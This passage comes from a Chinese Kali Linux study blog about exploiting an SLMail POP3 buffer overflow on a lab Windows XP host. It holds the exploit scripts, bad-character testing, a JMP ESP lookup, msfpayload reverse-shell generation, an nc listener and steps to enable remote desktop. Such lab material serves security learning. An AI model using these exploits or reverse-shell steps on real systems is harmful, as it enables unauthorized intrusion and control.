class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br>buffer<span class="token operator">=</span><span class="token string">“A”</span>2606+<span class="token string">“B”</span><em>4+<span class="token string">“C”</span></em><span class="token punctuation">(</span>3500-2606-4<span class="token punctuation">)</span><br>try:<br> print<span class="token punctuation">(</span><span class="token string">“Sending evil buffer…”</span><span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+buffer+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li></ul><br><p>计算一下发现是416B，够放shellcode</p><br><h4><a id="_191"></a>坏字符剔除</h4><br><p>不同类型的程序、协议等，会将某些字符认为是坏字符<br> 在返回地址、shellcode、buffer中都不能出现坏字符<br> 在pop3中，null、byte、（0x00）是空字符，用于终止字符串的拷贝<br> return（0x00）回车操作，表示PASS输入完成</p><br><p>为了查找所有坏字符<br> 发送0x00-0xff这256个字符，进行测试</p><br><p>脚本05.py测试坏字符</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br>badchars<span class="token operator">=</span><span class="token punctuation">(</span><br><span class="token string">“\x01\x02……\x10”</span><br><span class="token string">“\x11……”</span><br><span class="token string">“……”</span><br><span class="token string">“\xf1……\xff\x00”</span><span class="token punctuation">)</span> <span class="token comment">#把所有256个字符罗列完</span><br>buffer<span class="token operator">=</span><span class="token string">“A”</span><em>2606+<span class="token string">“B”</span></em>4+badchars<br>try:<br> print<span class="token punctuation">(</span><span class="token string">“Sending evil buffer…”</span><span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+buffer+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li></ul><br><p>根据结果不断修改和测试<br> 以找出所有坏字符</p><br><h4><a id="ESP_227"></a>ESP的地址</h4><br><p>ESP的地址会变化，不可硬编码<br> 寻找地址固定的系统模块，且其中有JUMP ESP指令<br> 然后可以在EIP里放这个指令的地址<br> 从而跳到ESP来执行shellcode<br> mona里有相应模块</p><br><p>在ImmunityDebugger中执行</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token operator">!</span>mona modules <span class="token comment">#查看模块</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"></ul><br><p>看rebase是False 即重启不变<br> 看safe、ADLR、DEP是False即安全模块不开<br> 看OS Dil是True即操作系统自带<br> 找到符合条件的模块（如slmfc.dil）后看他是否有jump esp指令</p><br><p>kali里执行</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token function">cd</span> /usr/share/metasploit-framework/tools<br>./nasm_shell.rb <span class="token comment">#将汇编语言转换为二进制</span><br><span class="token operator">&gt;</span>jmp esp <span class="token comment">#得到二进制</span><br><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li></ul><br><p>在ImmunityDebugger中执行</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token operator">!</span>mona <span class="token function">find</span> -s <span class="token string">“\xff\xe4”</span> -m slmfc.dil<div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"></ul><br><p>找到指令地址5F4B41E3并设置断点</p><br><p>脚本06.py</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br>buffer<span class="token operator">=</span><span class="token string">“A”</span><em>2606+<span class="token string">“\x03\x41\x4b\x5f”</span>+<span class="token string">“C”</span></em>390 <span class="token comment">#注意内存地址是全反的</span><br>try:<br> print<span class="token punctuation">(</span><span class="token string">“Sending evil buffer…”</span><span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+buffer+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li></ul><br><p>通过调试，已经可以令系统跳转到ESP了</p><br><h4><a id="shellcode_284"></a>shellcode</h4><br><p>kali里面</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token function">cd</span> /usr/share/framework2/<br>./msfpayload -l <span class="token comment">#查看msfpayload里的shellcode</span><br>./msfpayload win32_reverse LHOST<span class="token operator">=</span>192.168.20.8 LPORT<span class="token operator">=</span>443 C <span class="token comment">#反向连接，指定自己的IP和端口，C说明是C语言</span><br>./msfpayload win32_reverse LHOST<span class="token operator">=</span>192.168.20.8 LPORT<span class="token operator">=</span>443 R <span class="token operator">|</span> ./msfencode -b <span class="token string">“\x00\x0a\x0d”</span> <span class="token comment">#把坏字符编掉，R用来编码</span><br><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><br><p>生成shelllcode</p><br><p>脚本07.py</p><br><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token comment">#!/usr/bin/python</span><br><span class="token function">import</span> socket<br>s<span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><br>shellcode<span class="token operator">=</span>（<span class="token string">“”</span>） <span class="token comment">#在双引号里复制生成的shellcode</span><br>buffer<span class="token operator">=</span><span class="token string">“A”</span><em>2606+<span class="token string">“\x03\x41\x4b\x5f”</span>+<span class="token string">“\x90”</span></em>8+shellcode <span class="token comment">#x90是不操作，保证shellcode的有效性</span><br>try:<br> print<span class="token punctuation">(</span><span class="token string">“Sending evil buffer…”</span><span class="token punctuation">)</span><br> s.connect<span class="token punctuation">((</span><span class="token string">‘192.168.1.119’</span>,110<span class="token punctuation">)</span> <span class="token comment">#连接SLMail</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘USER test’</span>+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.recv<span class="token punctuation">(</span>1024<span class="token punctuation">)</span><br> s.send<span class="token punctuation">(</span><span class="token string">‘PASS’</span>+buffer+<span class="token string">‘\r\n’</span><span class="token punctuation">)</span><br> s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><br> print<span class="token punctuation">(</span><span class="token string">“\nDone”</span><span class="token punctuation">)</span><br>except:<br> print<span class="token punctuation">(</span><span class="token string">“Could not connect to POP3”</span><span class="token punctuation">)</span><div class="hljs-button signin" data-title="登录后复制" data-report-click="{"spm":"1001.2101.3001.4259"}"></div></code></pre><ul class="pre-numbering" style="opacity: 0.370293;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li></ul><br><p>理论上应该能成功<br> 用nc监听下443<br> 然后获得目标主机的shell</p><br><h4><a id="_323"></a>获取远程桌面</h4><br><p>在shell里修改注册表<br> 打开远程桌面<br> 这个网上蛮多</p><br><p>然后就可以随意发挥了</p><br><h1><a name="t3"></a><a name="t3"></a><a id="_330"></a>结语</h1><br><p>本次学习较为完整的实现对windows xp的控制<br> 通过SLMail这个经典漏洞<br> 了解了缓冲区溢出的相关知识</p><br><p>参考：<br> <a href="https://blog.csdn.net/levones/article/details/88233190" target="_blank" rel="noopener">https://blog.csdn.net/levones/article/details/88233190</a><br> <a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/80950537</a></p><br>                </div><div data-report-view="{"mod":"1585297308_001","dest":"https://fishpond.blog.csdn.net/article/details/104579315","extend1":"pc","ab":"new"}"><div></div></div><br>                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-d7a94ec6ab.css" rel="stylesheet"><br>                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-f1c5feb645.css" rel="stylesheet"><br>        </div><br>    </article>
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/WeChatpay.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2020/03/01/kali集合/kali第19个/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/119.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/119.jpg">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                ❄Kali linux 学习笔记（十九）缓冲区溢出——linux（crossfire） 2020.3.1</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2020/02/25/kali集合/kali第15个/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/115.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/all/115.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                ❄Kali linux 学习笔记（十五）主动信息收集——操作系统识别（TTL、SNMP、SMB、SMTP） 2020.2.25</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/avatar.jpg" itemprop="image" alt="flechazo" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">flechazo</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 flechazo<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2021不闻星河须臾固执走向你</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.i-flechazo-y.top/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">flechazo</a>, Powered by Flechazo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/Agoni37C/flechazo/myimg/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さらflechazoその一见钟情</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/Agoni37C" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="http://weibo.com/mashirozx?is_all=1" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=954655431&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/生活/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://www.yutu.cn/popsoft_1_2.html">
+                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                  资源
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/随想/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  随想
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/转载/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  转载
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/美文/">
+                  <i class="fa fa-gift" aria-hidden="true"></i>
+                  美文
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/photos/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/视频/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  视频
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/收藏/">
+                  <i class="fa fa-laptop" aria-hidden="true"></i>
+                  收藏
+                </a>
+              </li>
+            
+              <li>
+                <a href="/star/">
+                  <i class="fa fa-gratipay" aria-hidden="true"></i>
+                  追星
+                </a>
+              </li>
+            
+              <li>
+                <a href="/drama/">
+                  <i class="fa fa-tripadvisor" aria-hidden="true"></i>
+                  追剧
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/tags/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-tag" aria-hidden="true"></i>
+            标签
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/categories/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-bookmark" aria-hidden="true"></i>
+            分类
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <i class="fa fa-heart faa-pulse" aria-hidden="true"></i>
+                  赞赏
+                </a>
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <i class="fa fa-link faa-shake" aria-hidden="true"></i>
+                  友人
+                </a>
+              </li>
+            
+              <li>
+                <a href="/lab/">
+                  <i class="fa fa-cogs" aria-hidden="true"></i>
+                  Lab
+                </a>
+              </li>
+            
+              <li>
+                <a href="/my/log in/">
+                  <i class="fa fa-user-o" aria-hidden="true"></i>
+                  login
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            杂
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/lab/">
+                  <i class="fa fa-cogs" aria-hidden="true"></i>
+                  网站
+                </a>
+              </li>
+            
+              <li>
+                <a href="/my/site muban/">
+                  <i class="fa fa-user-o" aria-hidden="true"></i>
+                  模板
+                </a>
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <i class="fa fa-rss faa-pulse" aria-hidden="true"></i>
+                  RSS
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
